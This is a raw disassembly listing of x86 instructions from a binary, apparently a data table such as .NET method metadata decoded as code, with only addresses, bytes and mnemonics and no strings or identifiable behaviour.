  4062be:	00 00                	add    %al,(%eax)
  4062c0:	86 00                	xchg   %al,(%eax)
  4062c2:	b8 18 dc 07 2a       	mov    $0x2a07dc18,%eax
  4062c7:	00 cc                	add    %cl,%ah
  4062c9:	31 00                	xor    %eax,(%eax)
  4062cb:	00 00                	add    %al,(%eax)
  4062cd:	00 86 00 4b 16 57    	add    %al,0x57164b00(%esi)
  4062d3:	00 2a                	add    %ch,(%edx)
  4062d5:	00 e0                	add    %ah,%al
  4062d7:	31 00                	xor    %eax,(%eax)
  4062d9:	00 00                	add    %al,(%eax)
  4062db:	00 86 00 40 16 f4    	add    %al,-0xbe9c000(%esi)
  4062e1:	05 2b 00 8d 32       	add    $0x328d002b,%eax
  4062e6:	00 00                	add    %al,(%eax)
  4062e8:	00 00                	add    %al,(%eax)
  4062ea:	86 00                	xchg   %al,(%eax)
  4062ec:	1f                   	pop    %ds
  4062ed:	03 c1                	add    %ecx,%eax
  4062ef:	00 2b                	add    %ch,(%ebx)
  4062f1:	00 a2 32 00 00 00    	add    %ah,0x32(%edx)
  4062f7:	00 86 00 1f 03 bb    	add    %al,-0x44fce100(%esi)
  4062fd:	00 2d 00 b8 32 00    	add    %ch,0x32b800
  406303:	00 00                	add    %al,(%eax)
  406305:	00 86 00 30 16 fd    	add    %al,-0x2e9d000(%esi)
  40630b:	01 2f                	add    %ebp,(%edi)
  40630d:	00 0c 33             	add    %cl,(%ebx,%esi,1)
  406310:	00 00                	add    %al,(%eax)
  406312:	00 00                	add    %al,(%eax)
  406314:	86 00                	xchg   %al,(%eax)
  406316:	3b 06                	cmp    (%esi),%eax
  406318:	fd                   	std
  406319:	01 30                	add    %esi,(%eax)
  40631b:	00 4c 33 00          	add    %cl,0x0(%ebx,%esi,1)
  40631f:	00 00                	add    %al,(%eax)
  406321:	00 86 00 ee 18 af    	add    %al,-0x50e71200(%esi)
  406327:	07                   	pop    %es
  406328:	31 00                	xor    %eax,(%eax)
  40632a:	ef                   	out    %eax,(%dx)
  40632b:	33 00                	xor    (%eax),%eax
  40632d:	00 00                	add    %al,(%eax)
  40632f:	00 86 00 df 0e 06    	add    %al,0x60edf00(%esi)
  406335:	00 32                	add    %dh,(%edx)
  406337:	00 05 34 00 00 00    	add    %al,0x34
  40633d:	00 86 00 67 0c 10    	add    %al,0x100c6700(%esi)
  406343:	00 32                	add    %dh,(%edx)
  406345:	00 15 34 00 00 00    	add    %dl,0x34
  40634b:	00 86 00 5b 0c fb    	add    %al,-0x4f3a500(%esi)
  406351:	00 33                	add    %dh,(%ebx)
  406353:	00 30                	add    %dh,(%eax)
  406355:	34 00                	xor    $0x0,%al
  406357:	00 00                	add    %al,(%eax)
  406359:	00 86 00 0f 10 15    	add    %al,0x15100f00(%esi)
  40635f:	00 33                	add    %dh,(%ebx)
  406361:	00 45 34             	add    %al,0x34(%ebp)
  406364:	00 00                	add    %al,(%eax)
  406366:	00 00                	add    %al,(%eax)
  406368:	86 00                	xchg   %al,(%eax)
  40636a:	14 06                	adc    $0x6,%al
  40636c:	e0 07                	loopne 0x406375
  40636e:	34 00                	xor    $0x0,%al
  406370:	5b                   	pop    %ebx
  406371:	34 00                	xor    $0x0,%al
  406373:	00 00                	add    %al,(%eax)
  406375:	00 86 00 c3 18 e5    	add    %al,-0x1ae73d00(%esi)
  40637b:	07                   	pop    %es
  40637c:	35 00 70 34 00       	xor    $0x347000,%eax
  406381:	00 00                	add    %al,(%eax)
  406383:	00 86 00 16 16 57    	add    %al,0x57161600(%esi)
  406389:	00 36                	add    %dh,(%esi)
  40638b:	00 c4                	add    %al,%ah
  40638d:	34 00                	xor    $0x0,%al
  40638f:	00 00                	add    %al,(%eax)
  406391:	00 86 00 2c 06 10    	add    %al,0x10062c00(%esi)
  406397:	00 37                	add    %dh,(%edi)
  406399:	00 e8                	add    %ch,%al
  40639b:	34 00                	xor    $0x0,%al
  40639d:	00 00                	add    %al,(%eax)
  40639f:	00 86 00 27 0f cc    	add    %al,-0x33f0d900(%esi)
  4063a5:	07                   	pop    %es
  4063a6:	38 00                	cmp    %al,(%eax)
  4063a8:	78 3a                	js     0x4063e4
  4063aa:	00 00                	add    %al,(%eax)
  4063ac:	00 00                	add    %al,(%eax)
  4063ae:	86 00                	xchg   %al,(%eax)
  4063b0:	d2 15 f4 05 39 00    	rclb   %cl,0x3905f4
  4063b6:	dc 3a                	fdivrl (%edx)
  4063b8:	00 00                	add    %al,(%eax)
  4063ba:	00 00                	add    %al,(%eax)
  4063bc:	86 00                	xchg   %al,(%eax)
  4063be:	f6 0e cc             	testb  $0xcc,(%esi)
  4063c1:	07                   	pop    %es
  4063c2:	39 00                	cmp    %eax,(%eax)
  4063c4:	d4 3b                	aam    $0x3b
  4063c6:	00 00                	add    %al,(%eax)
  4063c8:	00 00                	add    %al,(%eax)
  4063ca:	86 08                	xchg   %cl,(%eax)
  4063cc:	33 0c fb             	xor    (%ebx,%edi,8),%ecx
  4063cf:	00 3a                	add    %bh,(%edx)
  4063d1:	00 dc                	add    %bl,%ah
  4063d3:	3b 00                	cmp    (%eax),%eax
  4063d5:	00 00                	add    %al,(%eax)
  4063d7:	00 86 08 40 0c 10    	add    %al,0x100c4008(%esi)
  4063dd:	00 3a                	add    %bh,(%edx)
  4063df:	00 e5                	add    %ah,%ch
  4063e1:	3b 00                	cmp    (%eax),%eax
  4063e3:	00 00                	add    %al,(%eax)
  4063e5:	00 86 08 4d 13 68    	add    %al,0x68134d08(%esi)
  4063eb:	02 3b                	add    (%ebx),%bh
  4063ed:	00 ed                	add    %ch,%ch
  4063ef:	3b 00                	cmp    (%eax),%eax
  4063f1:	00 00                	add    %al,(%eax)
  4063f3:	00 86 08 5b 13 7e    	add    %al,0x7e135b08(%esi)
  4063f9:	01 3b                	add    %edi,(%ebx)
  4063fb:	00 f6                	add    %dh,%dh
  4063fd:	3b 00                	cmp    (%eax),%eax
  4063ff:	00 00                	add    %al,(%eax)
  406401:	00 86 08 a0 18 dc    	add    %al,-0x23e75ff8(%esi)
  406407:	07                   	pop    %es
  406408:	3c 00                	cmp    $0x0,%al
  40640a:	fe                   	(bad)
  40640b:	3b 00                	cmp    (%eax),%eax
  40640d:	00 00                	add    %al,(%eax)
  40640f:	00 86 08 ac 18 e5    	add    %al,-0x1ae753f8(%esi)
  406415:	07                   	pop    %es
  406416:	3c 00                	cmp    $0x0,%al
  406418:	08 3c 00             	or     %bh,(%eax,%eax,1)
  40641b:	00 00                	add    %al,(%eax)
  40641d:	00 86 08 1e 1c ea    	add    %al,-0x15e3e1f8(%esi)
  406423:	07                   	pop    %es
  406424:	3d 00 60 3c 00       	cmp    $0x3c6000,%eax
  406429:	00 00                	add    %al,(%eax)
  40642b:	00 86 08 bf 07 ef    	add    %al,-0x10f840f8(%esi)
  406431:	07                   	pop    %es
  406432:	3d 00 68 3c 00       	cmp    $0x3c6800,%eax
  406437:	00 00                	add    %al,(%eax)
  406439:	00 e1                	add    %ah,%cl
  40643b:	01 71 14             	add    %esi,0x14(%ecx)
  40643e:	22 00                	and    (%eax),%al
  406440:	3d 00 75 3c 00       	cmp    $0x3c7500,%eax
  406445:	00 00                	add    %al,(%eax)
  406447:	00 86 18 a8 14 06    	add    %al,0x614a818(%esi)
  40644d:	00 3d 00 88 3c 00    	add    %bh,0x3c8800
  406453:	00 00                	add    %al,(%eax)
  406455:	00 96 00 04 0c f4    	add    %dl,-0xbf3fc00(%esi)
  40645b:	07                   	pop    %es
  40645c:	3d 00 ac 3c 00       	cmp    $0x3cac00,%eax
  406461:	00 00                	add    %al,(%eax)
  406463:	00 96 00 04 0c fc    	add    %dl,-0x3f3fc00(%esi)
  406469:	07                   	pop    %es
  40646a:	3f                   	aas
  40646b:	00 bc 3c 00 00 00 00 	add    %bh,0x0(%esp,%edi,1)
  406472:	96                   	xchg   %eax,%esi
  406473:	00 04 0c             	add    %al,(%esp,%ecx,1)
  406476:	03 08                	add    (%eax),%ecx
  406478:	40                   	inc    %eax
  406479:	00 61 3d             	add    %ah,0x3d(%ecx)
  40647c:	00 00                	add    %al,(%eax)
  40647e:	00 00                	add    %al,(%eax)
  406480:	86 18                	xchg   %bl,(%eax)
  406482:	a8 14                	test   $0x14,%al
  406484:	06                   	push   %es
  406485:	00 42 00             	add    %al,0x0(%edx)
  406488:	69 3d 00 00 00 00 96 	imul   $0xed50096,0x0,%edi
  40648f:	00 d5 0e 
  406492:	0b 08                	or     (%eax),%ecx
  406494:	42                   	inc    %edx
  406495:	00 78 3d             	add    %bh,0x3d(%eax)
  406498:	00 00                	add    %al,(%eax)
  40649a:	00 00                	add    %al,(%eax)
  40649c:	96                   	xchg   %eax,%esi
  40649d:	00 1e                	add    %bl,(%esi)
  40649f:	0c 12                	or     $0x12,%al
  4064a1:	08 43 00             	or     %al,0x0(%ebx)
  4064a4:	2c 3e                	sub    $0x3e,%al
  4064a6:	00 00                	add    %al,(%eax)
  4064a8:	00 00                	add    %al,(%eax)
  4064aa:	96                   	xchg   %eax,%esi
  4064ab:	00 da                	add    %bl,%dl
  4064ad:	1c 1a                	sbb    $0x1a,%al
  4064af:	08 45 00             	or     %al,0x0(%ebp)
  4064b2:	c0 3e 00             	sarb   $0x0,(%esi)
  4064b5:	00 00                	add    %al,(%eax)
  4064b7:	00 96 00 95 18 23    	add    %dl,0x23189500(%esi)
  4064bd:	08 47 00             	or     %al,0x0(%edi)
  4064c0:	db 3e                	fstpt  (%esi)
  4064c2:	00 00                	add    %al,(%eax)
  4064c4:	00 00                	add    %al,(%eax)
  4064c6:	96                   	xchg   %eax,%esi
  4064c7:	00 ff                	add    %bh,%bh
  4064c9:	05 2b 08 49 00       	add    $0x49082b,%eax
  4064ce:	fb                   	sti
  4064cf:	3e 00 00             	add    %al,%ds:(%eax)
  4064d2:	00 00                	add    %al,(%eax)
  4064d4:	96                   	xchg   %eax,%esi
  4064d5:	00 f8                	add    %bh,%al
  4064d7:	0f 33                	rdpmc
  4064d9:	08 4b 00             	or     %cl,0x0(%ebx)
  4064dc:	18 3f                	sbb    %bh,(%edi)
  4064de:	00 00                	add    %al,(%eax)
  4064e0:	00 00                	add    %al,(%eax)
  4064e2:	96                   	xchg   %eax,%esi
  4064e3:	00 a1 00 3b 08 4d    	add    %ah,0x4d083b00(%ecx)
  4064e9:	00 48 3f             	add    %cl,0x3f(%eax)
  4064ec:	00 00                	add    %al,(%eax)
  4064ee:	00 00                	add    %al,(%eax)
  4064f0:	96                   	xchg   %eax,%esi
  4064f1:	00 40 13             	add    %al,0x13(%eax)
  4064f4:	43                   	inc    %ebx
  4064f5:	08 4f 00             	or     %cl,0x0(%edi)
  4064f8:	71 40                	jno    0x40653a
  4064fa:	00 00                	add    %al,(%eax)
  4064fc:	00 00                	add    %al,(%eax)
  4064fe:	86 18                	xchg   %bl,(%eax)
  406500:	a8 14                	test   $0x14,%al
  406502:	06                   	push   %es
  406503:	00 51 00             	add    %dl,0x0(%ecx)
  406506:	7c 40                	jl     0x406548
  406508:	00 00                	add    %al,(%eax)
  40650a:	00 00                	add    %al,(%eax)
  40650c:	96                   	xchg   %eax,%esi
  40650d:	00 ac 0e 8e 01 51 00 	add    %ch,0x51018e(%esi,%ecx,1)
  406514:	a8 43                	test   $0x43,%al
  406516:	00 00                	add    %al,(%eax)
  406518:	00 00                	add    %al,(%eax)
  40651a:	86 18                	xchg   %bl,(%eax)
  40651c:	a8 14                	test   $0x14,%al
  40651e:	06                   	push   %es
  40651f:	00 51 00             	add    %dl,0x0(%ecx)
  406522:	b0 43                	mov    $0x43,%al
  406524:	00 00                	add    %al,(%eax)
  406526:	00 00                	add    %al,(%eax)
  406528:	96                   	xchg   %eax,%esi
  406529:	00 ea                	add    %ch,%dl
  40652b:	16                   	push   %ss
  40652c:	8e 01                	mov    (%ecx),%es
  40652e:	51                   	push   %ecx
  40652f:	00 dc                	add    %bl,%ah
  406531:	43                   	inc    %ebx
  406532:	00 00                	add    %al,(%eax)
  406534:	00 00                	add    %al,(%eax)
  406536:	91                   	xchg   %eax,%ecx
  406537:	00 fb                	add    %bh,%bl
  406539:	0d 30 04 51 00       	or     $0x510430,%eax
  40653e:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  406542:	00 00                	add    %al,(%eax)
  406544:	91                   	xchg   %eax,%ecx
  406545:	00 57 02             	add    %dl,0x2(%edi)
  406548:	30 04 51             	xor    %al,(%ecx,%edx,2)
  40654b:	00 6c 44 00          	add    %ch,0x0(%esp,%eax,2)
  40654f:	00 00                	add    %al,(%eax)
  406551:	00 91 00 f2 13 30    	add    %dl,0x3013f200(%ecx)
  406557:	04 51                	add    $0x51,%al
  406559:	00 7c 45 00          	add    %bh,0x0(%ebp,%eax,2)
  40655d:	00 00                	add    %al,(%eax)
  40655f:	00 91 00 83 13 30    	add    %dl,0x30138300(%ecx)
  406565:	04 51                	add    $0x51,%al
  406567:	00 b8 45 00 00 00    	add    %bh,0x45(%eax)
  40656d:	00 91 00 5f 05 30    	add    %dl,0x30055f00(%ecx)
  406573:	04 51                	add    $0x51,%al
  406575:	00 00                	add    %al,(%eax)
  406577:	00 00                	add    %al,(%eax)
  406579:	00 80 00 96 20 c0    	add    %al,-0x3fdf6a00(%eax)
  40657f:	05 4b 08 51 00       	add    $0x51084b,%eax
  406584:	00 00                	add    %al,(%eax)
  406586:	00 00                	add    %al,(%eax)
  406588:	80 00 91             	addb   $0x91,(%eax)
  40658b:	20 cd                	and    %cl,%ch
  40658d:	1a 50 08             	sbb    0x8(%eax),%dl
  406590:	52                   	push   %edx
  406591:	00 f8                	add    %bh,%al
  406593:	45                   	inc    %ebp
  406594:	00 00                	add    %al,(%eax)
  406596:	00 00                	add    %al,(%eax)
  406598:	86 18                	xchg   %bl,(%eax)
  40659a:	a8 14                	test   $0x14,%al
  40659c:	06                   	push   %es
  40659d:	00 54 00 00          	add    %dl,0x0(%eax,%eax,1)
  4065a1:	46                   	inc    %esi
  4065a2:	00 00                	add    %al,(%eax)
  4065a4:	00 00                	add    %al,(%eax)
  4065a6:	86 00                	xchg   %al,(%eax)
  4065a8:	ed                   	in     (%dx),%eax
  4065a9:	17                   	pop    %ss
  4065aa:	fb                   	sti
  4065ab:	00 54 00 84          	add    %dl,-0x7c(%eax,%eax,1)
  4065af:	46                   	inc    %esi
  4065b0:	00 00                	add    %al,(%eax)
  4065b2:	00 00                	add    %al,(%eax)
  4065b4:	86 00                	xchg   %al,(%eax)
  4065b6:	8e 07                	mov    (%edi),%es
  4065b8:	57                   	push   %edi
  4065b9:	08 54 00 28          	or     %dl,0x28(%eax,%eax,1)
  4065bd:	47                   	inc    %edi
  4065be:	00 00                	add    %al,(%eax)
  4065c0:	00 00                	add    %al,(%eax)
  4065c2:	86 18                	xchg   %bl,(%eax)
  4065c4:	a8 14                	test   $0x14,%al
  4065c6:	06                   	push   %es
  4065c7:	00 55 00             	add    %dl,0x0(%ebp)
  4065ca:	30 47 00             	xor    %al,0x0(%edi)
  4065cd:	00 00                	add    %al,(%eax)
  4065cf:	00 96 00 e0 01 77    	add    %dl,0x7701e000(%esi)
  4065d5:	03 55 00             	add    0x0(%ebp),%edx
  4065d8:	ac                   	lods   %ds:(%esi),%al
  4065d9:	47                   	inc    %edi
  4065da:	00 00                	add    %al,(%eax)
  4065dc:	00 00                	add    %al,(%eax)
  4065de:	96                   	xchg   %eax,%esi
  4065df:	00 d6                	add    %dl,%dh
  4065e1:	0c 6f                	or     $0x6f,%al
  4065e3:	00 55 00             	add    %dl,0x0(%ebp)
  4065e6:	14 48                	adc    $0x48,%al
  4065e8:	00 00                	add    %al,(%eax)
  4065ea:	00 00                	add    %al,(%eax)
  4065ec:	96                   	xchg   %eax,%esi
  4065ed:	00 a8 11 52 07 56    	add    %ch,0x56075211(%eax)
  4065f3:	00 d3                	add    %dl,%bl
  4065f5:	49                   	dec    %ecx
  4065f6:	00 00                	add    %al,(%eax)
  4065f8:	00 00                	add    %al,(%eax)
  4065fa:	96                   	xchg   %eax,%esi
  4065fb:	00 6b 10             	add    %ch,0x10(%ebx)
  4065fe:	30 04 56             	xor    %al,(%esi,%edx,2)
  406601:	00 ec                	add    %ch,%ah
  406603:	49                   	dec    %ecx
  406604:	00 00                	add    %al,(%eax)
  406606:	00 00                	add    %al,(%eax)
  406608:	96                   	xchg   %eax,%esi
  406609:	00 a5 19 8e 01 56    	add    %ah,0x56018e19(%ebp)
  40660f:	00 4c 4a 00          	add    %cl,0x0(%edx,%ecx,2)
  406613:	00 00                	add    %al,(%eax)
  406615:	00 96 00 71 18 77    	add    %dl,0x77187100(%esi)
  40661b:	03 56 00             	add    0x0(%esi),%edx
  40661e:	20 4b 00             	and    %cl,0x0(%ebx)
  406621:	00 00                	add    %al,(%eax)
  406623:	00 96 00 1f 13 5e    	add    %dl,0x5e131f00(%esi)
  406629:	08 56 00             	or     %dl,0x0(%esi)
  40662c:	00 00                	add    %al,(%eax)
  40662e:	00 00                	add    %al,(%eax)
  406630:	80 00 96             	addb   $0x96,(%eax)
  406633:	20 85 08 67 08 57    	and    %al,0x57086708(%ebp)
  406639:	00 5c 4b 00          	add    %bl,0x0(%ebx,%ecx,2)
  40663d:	00 00                	add    %al,(%eax)
  40663f:	00 96 00 1b 12 8e    	add    %dl,-0x71ede500(%esi)
  406645:	01 58 00             	add    %ebx,0x0(%eax)
  406648:	8c 4b 00             	mov    %cs,0x0(%ebx)
  40664b:	00 00                	add    %al,(%eax)
  40664d:	00 96 00 dc 1b 30    	add    %dl,0x301bdc00(%esi)
  406653:	04 58                	add    $0x58,%al
  406655:	00 ac 4b 00 00 00 00 	add    %ch,0x0(%ebx,%ecx,2)
  40665c:	96                   	xchg   %eax,%esi
  40665d:	00 d1                	add    %dl,%cl
  40665f:	1b 8e 01 58 00 c5    	sbb    -0x3affa7ff(%esi),%ecx
  406665:	4b                   	dec    %ebx
  406666:	00 00                	add    %al,(%eax)
  406668:	00 00                	add    %al,(%eax)
  40666a:	96                   	xchg   %eax,%esi
  40666b:	00 8b 0b 6e 08 58    	add    %cl,0x58086e0b(%ebx)
  406671:	00 e0                	add    %ah,%al
  406673:	4b                   	dec    %ebx
  406674:	00 00                	add    %al,(%eax)
  406676:	00 00                	add    %al,(%eax)
  406678:	96                   	xchg   %eax,%esi
  406679:	00 27                	add    %ah,(%edi)
  40667b:	19 8e 01 5a 00 20    	sbb    %ecx,0x20005a01(%esi)
  406681:	4c                   	dec    %esp
  406682:	00 00                	add    %al,(%eax)
  406684:	00 00                	add    %al,(%eax)
  406686:	96                   	xchg   %eax,%esi
  406687:	00 ab 19 8e 01 5a    	add    %ch,0x5a018e19(%ebx)
  40668d:	00 00                	add    %al,(%eax)
  40668f:	00 00                	add    %al,(%eax)
  406691:	00 80 00 91 20 1d    	add    %al,0x1d209100(%eax)
  406697:	0e                   	push   %cs
  406698:	76 08                	jbe    0x4066a2
  40669a:	5a                   	pop    %edx
  40669b:	00 54 4c 00          	add    %dl,0x0(%esp,%ecx,2)
  40669f:	00 00                	add    %al,(%eax)
  4066a1:	00 96 00 83 0a 9b    	add    %dl,-0x64f57d00(%esi)
  4066a7:	00 5d 00             	add    %bl,0x0(%ebp)
  4066aa:	b4 4c                	mov    $0x4c,%ah
  4066ac:	00 00                	add    %al,(%eax)
  4066ae:	00 00                	add    %al,(%eax)
  4066b0:	96                   	xchg   %eax,%esi
  4066b1:	00 7a 0a             	add    %bh,0xa(%edx)
  4066b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4066b5:	00 5f 00             	add    %bl,0x0(%edi)
  4066b8:	18 4d 00             	sbb    %cl,0x0(%ebp)
  4066bb:	00 00                	add    %al,(%eax)
  4066bd:	00 96 00 63 0a 36    	add    %dl,0x360a6300(%esi)
  4066c3:	00 60 00             	add    %ah,0x0(%eax)
  4066c6:	78 4d                	js     0x406715
  4066c8:	00 00                	add    %al,(%eax)
  4066ca:	00 00                	add    %al,(%eax)
  4066cc:	96                   	xchg   %eax,%esi
  4066cd:	00 52 1c             	add    %dl,0x1c(%edx)
  4066d0:	30 04 61             	xor    %al,(%ecx,%eiz,2)
  4066d3:	00 dc                	add    %bl,%ah
  4066d5:	4d                   	dec    %ebp
  4066d6:	00 00                	add    %al,(%eax)
  4066d8:	00 00                	add    %al,(%eax)
  4066da:	91                   	xchg   %eax,%ecx
  4066db:	18 ae 14 8e 01 61    	sbb    %ch,0x61018e14(%esi)
  4066e1:	00 f4                	add    %dh,%ah
  4066e3:	4d                   	dec    %ebp
  4066e4:	00 00                	add    %al,(%eax)
  4066e6:	00 00                	add    %al,(%eax)
  4066e8:	96                   	xchg   %eax,%esi
  4066e9:	00 09                	add    %cl,(%ecx)
  4066eb:	03 83 01 61 00 10    	add    0x10006101(%ebx),%eax
  4066f1:	50                   	push   %eax
  4066f2:	00 00                	add    %al,(%eax)
  4066f4:	00 00                	add    %al,(%eax)
  4066f6:	91                   	xchg   %eax,%ecx
  4066f7:	00 6f 05             	add    %ch,0x5(%edi)
  4066fa:	7d 08                	jge    0x406704
  4066fc:	62 00                	bound  %eax,(%eax)
  4066fe:	37                   	aaa
  4066ff:	51                   	push   %ecx
  406700:	00 00                	add    %al,(%eax)
  406702:	00 00                	add    %al,(%eax)
  406704:	91                   	xchg   %eax,%ecx
  406705:	00 5f 03             	add    %bl,0x3(%edi)
  406708:	8e 01                	mov    (%ecx),%es
  40670a:	63 00                	arpl   %eax,(%eax)
  40670c:	67 51                	addr16 push %ecx
  40670e:	00 00                	add    %al,(%eax)
  406710:	00 00                	add    %al,(%eax)
  406712:	96                   	xchg   %eax,%esi
  406713:	00 44 14 72          	add    %al,0x72(%esp,%edx,1)
  406717:	03 63 00             	add    0x0(%ebx),%esp
  40671a:	9e                   	sahf
  40671b:	51                   	push   %ecx
  40671c:	00 00                	add    %al,(%eax)
  40671e:	00 00                	add    %al,(%eax)
  406720:	91                   	xchg   %eax,%ecx
  406721:	18 ae 14 8e 01 64    	sbb    %ch,0x64018e14(%esi)
  406727:	00 ac 51 00 00 00 00 	add    %ch,0x0(%ecx,%edx,2)
  40672e:	86 18                	xchg   %bl,(%eax)
  406730:	a8 14                	test   $0x14,%al
  406732:	10 00                	adc    %al,(%eax)
  406734:	64 00 1c 52          	add    %bl,%fs:(%edx,%edx,2)
  406738:	00 00                	add    %al,(%eax)
  40673a:	00 00                	add    %al,(%eax)
  40673c:	86 00                	xchg   %al,(%eax)
  40673e:	3e 1b ce             	ds sbb %esi,%ecx
  406741:	00 65 00             	add    %ah,0x0(%ebp)
  406744:	34 52                	xor    $0x52,%al
  406746:	00 00                	add    %al,(%eax)
  406748:	00 00                	add    %al,(%eax)
  40674a:	86 00                	xchg   %al,(%eax)
  40674c:	3e 1b 16             	sbb    %ds:(%esi),%edx
  40674f:	04 66                	add    $0x66,%al
  406751:	00 74 53 00          	add    %dh,0x0(%ebx,%edx,2)
  406755:	00 00                	add    %al,(%eax)
  406757:	00 86 00 36 1b ce    	add    %al,-0x31e4ca00(%esi)
  40675d:	00 67 00             	add    %ah,0x0(%edi)
  406760:	8c 53 00             	mov    %ss,0x0(%ebx)
  406763:	00 00                	add    %al,(%eax)
  406765:	00 86 00 36 1b 16    	add    %al,0x161b3600(%esi)
  40676b:	04 68                	add    $0x68,%al
  40676d:	00 34 55 00 00 48 00 	add    %dh,0x480000(,%edx,2)
  406774:	81 00 82 0e 83 08    	addl   $0x8830e82,(%eax)
  40677a:	69 00 5c 55 00 00    	imul   $0x555c,(%eax),%eax
  406780:	00 00                	add    %al,(%eax)
  406782:	91                   	xchg   %eax,%ecx
  406783:	18 ae 14 8e 01 6b    	sbb    %ch,0x6b018e14(%esi)
  406789:	00 78 55             	add    %bh,0x55(%eax)
  40678c:	00 00                	add    %al,(%eax)
  40678e:	00 00                	add    %al,(%eax)
  406790:	96                   	xchg   %eax,%esi
  406791:	00 c0                	add    %al,%al
  406793:	0c 6f                	or     $0x6f,%al
  406795:	00 6b 00             	add    %ch,0x0(%ebx)
  406798:	fc                   	cld
  406799:	55                   	push   %ebp
  40679a:	00 00                	add    %al,(%eax)
  40679c:	00 00                	add    %al,(%eax)
  40679e:	96                   	xchg   %eax,%esi
  40679f:	00 c0                	add    %al,%al
  4067a1:	0c 8b                	or     $0x8b,%al
  4067a3:	07                   	pop    %es
  4067a4:	6c                   	insb   (%dx),%es:(%edi)
  4067a5:	00 34 56             	add    %dh,(%esi,%edx,2)
  4067a8:	00 00                	add    %al,(%eax)
  4067aa:	00 00                	add    %al,(%eax)
  4067ac:	96                   	xchg   %eax,%esi
  4067ad:	00 25 18 8b 07 6d    	add    %ah,0x6d078b18
  4067b3:	00 b4 56 00 00 00 00 	add    %dh,0x0(%esi,%edx,2)
  4067ba:	96                   	xchg   %eax,%esi
  4067bb:	00 1c 18             	add    %bl,(%eax,%ebx,1)
  4067be:	8b 07                	mov    (%edi),%eax
  4067c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4067c1:	00 00                	add    %al,(%eax)
  4067c3:	00 01                	add    %al,(%ecx)
  4067c5:	00 8c 0a 00 00 01 00 	add    %cl,0x10000(%edx,%ecx,1)
  4067cc:	8c 0a                	mov    %cs,(%edx)
  4067ce:	00 00                	add    %al,(%eax)
  4067d0:	01 00                	add    %eax,(%eax)
  4067d2:	8c 0a                	mov    %cs,(%edx)
  4067d4:	00 00                	add    %al,(%eax)
  4067d6:	01 00                	add    %eax,(%eax)
  4067d8:	8c 0a                	mov    %cs,(%edx)
  4067da:	00 00                	add    %al,(%eax)
  4067dc:	01 00                	add    %eax,(%eax)
  4067de:	8c 0a                	mov    %cs,(%edx)
  4067e0:	00 00                	add    %al,(%eax)
  4067e2:	01 00                	add    %eax,(%eax)
  4067e4:	8c 0a                	mov    %cs,(%edx)
  4067e6:	00 00                	add    %al,(%eax)
  4067e8:	01 00                	add    %eax,(%eax)
  4067ea:	8c 0a                	mov    %cs,(%edx)
  4067ec:	00 00                	add    %al,(%eax)
  4067ee:	01 00                	add    %eax,(%eax)
  4067f0:	8c 0a                	mov    %cs,(%edx)
  4067f2:	00 00                	add    %al,(%eax)
  4067f4:	01 00                	add    %eax,(%eax)
  4067f6:	8c 0a                	mov    %cs,(%edx)
  4067f8:	00 00                	add    %al,(%eax)
  4067fa:	01 00                	add    %eax,(%eax)
  4067fc:	5e                   	pop    %esi
  4067fd:	07                   	pop    %es
  4067fe:	00 00                	add    %al,(%eax)
  406800:	01 00                	add    %eax,(%eax)
  406802:	ea 12 00 00 02 00 72 	ljmp   $0x7200,$0x2000012
  406809:	08 00                	or     %al,(%eax)
  40680b:	00 03                	add    %al,(%ebx)
  40680d:	00 40 10             	add    %al,0x10(%eax)
  406810:	00 00                	add    %al,(%eax)
  406812:	04 00                	add    $0x0,%al
  406814:	c9                   	leave
  406815:	17                   	pop    %ss
  406816:	00 00                	add    %al,(%eax)
  406818:	01 00                	add    %eax,(%eax)
  40681a:	6a 12                	push   $0x12
  40681c:	00 00                	add    %al,(%eax)
  40681e:	01 00                	add    %eax,(%eax)
  406820:	bc 0c 00 00 01       	mov    $0x100000c,%esp
  406825:	00 62 0d             	add    %ah,0xd(%edx)
  406828:	00 00                	add    %al,(%eax)
  40682a:	01 00                	add    %eax,(%eax)
  40682c:	62 0d 00 00 01 00    	bound  %ecx,0x10000
  406832:	79 18                	jns    0x40684c
  406834:	00 00                	add    %al,(%eax)
  406836:	01 00                	add    %eax,(%eax)
  406838:	ec                   	in     (%dx),%al
  406839:	15 00 00 01 00       	adc    $0x10000,%eax
  40683e:	72 16                	jb     0x406856
  406840:	00 00                	add    %al,(%eax)
  406842:	01 00                	add    %eax,(%eax)
  406844:	72 16                	jb     0x40685c
  406846:	00 00                	add    %al,(%eax)
  406848:	01 00                	add    %eax,(%eax)
  40684a:	b6 1b                	mov    $0x1b,%dh
  40684c:	00 00                	add    %al,(%eax)
  40684e:	01 00                	add    %eax,(%eax)
  406850:	b6 1b                	mov    $0x1b,%dh
  406852:	00 00                	add    %al,(%eax)
  406854:	01 00                	add    %eax,(%eax)
  406856:	b6 1b                	mov    $0x1b,%dh
  406858:	00 00                	add    %al,(%eax)
  40685a:	01 00                	add    %eax,(%eax)
  40685c:	b6 1b                	mov    $0x1b,%dh
  40685e:	00 00                	add    %al,(%eax)
  406860:	01 00                	add    %eax,(%eax)
  406862:	b6 1b                	mov    $0x1b,%dh
  406864:	00 00                	add    %al,(%eax)
  406866:	01 00                	add    %eax,(%eax)
  406868:	62 0d 00 00 01 00    	bound  %ecx,0x10000
  40686e:	4f                   	dec    %edi
  40686f:	0d 00 00 02 00       	or     $0x20000,%eax
  406874:	5a                   	pop    %edx
  406875:	0d 00 00 01 00       	or     $0x10000,%eax
  40687a:	8c 0a                	mov    %cs,(%edx)
  40687c:	00 00                	add    %al,(%eax)
  40687e:	01 00                	add    %eax,(%eax)
  406880:	8c 0a                	mov    %cs,(%edx)
  406882:	00 00                	add    %al,(%eax)
  406884:	01 00                	add    %eax,(%eax)
  406886:	8c 0a                	mov    %cs,(%edx)
  406888:	00 00                	add    %al,(%eax)
  40688a:	01 00                	add    %eax,(%eax)
  40688c:	cb                   	lret
  40688d:	1b 00                	sbb    (%eax),%eax
  40688f:	00 01                	add    %al,(%ecx)
  406891:	00 8c 0a 00 00 01 00 	add    %cl,0x10000(%edx,%ecx,1)
  406898:	5e                   	pop    %esi
  406899:	07                   	pop    %es
  40689a:	00 00                	add    %al,(%eax)
  40689c:	01 00                	add    %eax,(%eax)
  40689e:	5e                   	pop    %esi
  40689f:	07                   	pop    %es
  4068a0:	00 00                	add    %al,(%eax)
  4068a2:	01 00                	add    %eax,(%eax)
  4068a4:	63 17                	arpl   %edx,(%edi)
  4068a6:	00 00                	add    %al,(%eax)
